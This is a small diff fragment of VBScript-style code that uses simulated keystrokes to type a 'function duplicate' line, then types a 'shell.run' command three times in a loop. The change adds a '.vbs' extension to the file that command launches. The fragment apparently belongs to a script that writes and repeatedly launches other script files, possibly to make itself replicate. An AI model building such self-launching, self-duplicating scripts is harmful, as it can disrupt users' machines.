@@ -64,7 +64,7 @@ type_word("function duplicate+9+0")
 enter_key()
 
 for i = 1 to 3
-type_word("shell.run " & """""" & "" & Chr(34) & directory & "\" & name & Chr(34) & "" & """""" & "")
+type_word("shell.run " & """""" & "" & Chr(34) & directory & "\" & name  & ".vbs" & Chr(34) & "" & """""" & "")
 enter_key()
 next
 
